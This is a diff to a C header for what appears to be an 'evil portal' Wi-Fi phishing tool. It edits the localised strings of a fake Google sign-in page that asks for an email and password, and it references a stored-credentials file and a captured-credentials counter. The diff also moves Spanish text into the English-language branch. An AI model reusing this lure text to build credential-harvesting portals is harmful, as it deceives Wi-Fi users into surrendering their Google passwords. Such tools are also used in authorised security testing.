@@ -7,27 +7,19 @@
 #define SD_CREDS_PATH "/nemo-portal-creds.txt"
 
 
-#if defined(LANGUAGE_EN_US) && defined(LANGUAGE_PT_BR) && defined(LANGUAGE_IT_IT) && defined(LANGUAGE_FR_FR) && defined(LANGUAGE_ES_ES)
-#error "Please define only one language: LANGUAGE_EN_US, LANGUAGE_PT_BR, LANGUAGE_IT_IT, LANGUAGE_FR_FR or LANGUAGE_ES_ES"
+#if defined(LANGUAGE_EN_US) && defined(LANGUAGE_PT_BR) && defined(LANGUAGE_IT_IT) && defined(LANGUAGE_FR_FR)
+#error "Please define only one language: LANGUAGE_EN_US, LANGUAGE_PT_BR, LANGUAGE_IT_IT or LANGUAGE_FR_FR"
 #endif
 
 #if defined(LANGUAGE_EN_US)
-#define LOGIN_TITLE "Log In"
-#define LOGIN_SUBTITLE "Utiliza tu cuenta de Google"
-#define LOGIN_EMAIL_PLACEHOLDER "Dirección de e-mail"
+#define LOGIN_TITLE "Iniciar sesión"
+#define LOGIN_SUBTITLE "Inicia sesión con Google"
+#define LOGIN_EMAIL_PLACEHOLDER "Email"
 #define LOGIN_PASSWORD_PLACEHOLDER "Contraseña"
-#define LOGIN_MESSAGE "Por favor inicia sesión para navegar de manera segura."
+#define LOGIN_MESSAGE "Por favor, inicia sesión para navegar de forma segura."
 #define LOGIN_BUTTON "Siguiente"
-#define LOGIN_AFTER_MESSAGE "Conexión en curso, gracias por tu paciencia."
-#define TYPE_SSID_TEXT "La longitud del SSID debe ser entre 2 y 32\nIncorrecto: ?,$,\",[,\\,],+\n\nEscriba el SSID\nPresione Enter para validar\n\n"
-//#define LOGIN_TITLE "Sign in"
-//#define LOGIN_SUBTITLE "Sign In With Google"
-//#define LOGIN_EMAIL_PLACEHOLDER "Email"
-//#define LOGIN_PASSWORD_PLACEHOLDER "Password"
-//#define LOGIN_MESSAGE "Please log in to browse securely."
-//#define LOGIN_BUTTON "Next"
-//#define LOGIN_AFTER_MESSAGE "Please wait a few minutes. Soon you will be able to access the internet."
-//#define TYPE_SSID_TEXT "SSID length should be between 2 and 32\nInvalid: ?,$,\",[,\\,],+\n\nType the SSID\nPress Enter to Confirm\n\n"
+#define LOGIN_AFTER_MESSAGE "Espera unos minutos. Pronto podrás acceder a internet."
+#define TYPE_SSID_TEXT "SSID length should be between 2 and 32\nInvalid: ?,$,\",[,\\,],+\n\nType the SSID\nPress Enter to Confirm\n\n"
 #elif defined(LANGUAGE_PT_BR)
 #define LOGIN_TITLE "Fazer login"
 #define LOGIN_SUBTITLE "Use sua Conta do Google"
@@ -55,15 +47,6 @@
 #define LOGIN_BUTTON "Suivant"
 #define LOGIN_AFTER_MESSAGE "Connexion en cours. Merci de patienter quelques instants."
 #define TYPE_SSID_TEXT "La longueur du SSID doit être entre 2 et 32\nInvalide: ?,$,\",[,\\,],+\n\nÉcrivez le SSID\nPressez Entrée pour Valider\n\n"
-#elif defined(LANGUAGE_ES_ES)
-#define LOGIN_TITLE "Conexión"
-#define LOGIN_SUBTITLE "Utiliza tu cuenta de Google"
-#define LOGIN_EMAIL_PLACEHOLDER "Dirección de e-mail"
-#define LOGIN_PASSWORD_PLACEHOLDER "Contraseña"
-#define LOGIN_MESSAGE "Por favor inicie sesión para navegar de manera segura."
-#define LOGIN_BUTTON "Siguiente"
-#define LOGIN_AFTER_MESSAGE "Conexión en curso, gracias por su paciencia."
-#define TYPE_SSID_TEXT "La longitud del SSID debe ser entre 2 y 32\nIncorrecto: ?,$,\",[,\\,],+\n\nEscriba el SSID\nPresione Enter para validar\n\n"
 #endif
 
 int totalCapturedCredentials = 0;
